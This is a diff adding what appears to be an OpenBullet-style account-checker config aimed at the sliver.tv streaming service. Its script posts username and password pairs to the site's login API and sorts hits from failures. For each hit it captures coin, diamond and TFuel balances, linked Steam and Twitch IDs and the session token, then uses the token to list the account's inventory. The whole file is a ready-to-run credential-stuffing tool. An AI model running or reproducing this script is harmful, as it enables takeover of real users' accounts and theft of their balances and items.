@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "silver.tv",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-01T01:09:36.4681095+01:00",
+  "AdditionalInfo": "",
+  "Author": "HvH.site",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.sliver.tv/v1/user/auth" 
+  CONTENT "{\"email_or_username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Origin: https://www.sliver.tv" 
+  HEADER "Referer: https://www.sliver.tv/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "X-App-Version: 4" 
+  HEADER "X-Platform: web" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"SUCCESS\",\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"ERROR\",\"body\":{\"" 
+    KEY "ge\":\"Invalid login " 
+    KEY "credentials.\",\"error_code\":" 
+
+PARSE "<SOURCE>" LR "username\":\"" "\",\"" -> CAP "Username" 
+
+PARSE "<SOURCE>" LR "\"diamonds\":" ",\"milli" -> CAP "Diamonds" 
+
+PARSE "<SOURCE>" LR "coins\":" "}}" -> CAP "Coins" 
+
+PARSE "<SOURCE>" LR "tfuel\":\"" "\",\"" -> CAP "Tfuel" 
+
+PARSE "<SOURCE>" LR "steam_id\":" ",\"" -> CAP "Steam linked" 
+
+PARSE "<SOURCE>" LR ",\"twitch_id\":" ",\"" -> CAP "Twitch linked" 
+
+PARSE "<SOURCE>" LR "\"id\":\"" "\",\"" -> VAR "idd" 
+
+PARSE "<SOURCE>" LR ",\"access_token\":\"" "\",\"" -> VAR "token" 
+
+REQUEST GET "https://api.sliver.tv/v1/user/<idd>/inventory/list?number=100" 
+  
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Origin: https://www.sliver.tv" 
+  HEADER "Referer: https://www.sliver.tv/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "X-App-Version: 4" 
+  HEADER "X-Platform: web" 
+  HEADER "X-Auth-Token: <token>" 
+  HEADER "X-Auth-User: <idd>" 
+
+PARSE "<SOURCE>" LR "name\":\"" "\",\"" Recursive=TRUE -> CAP "Inventory items" 
+
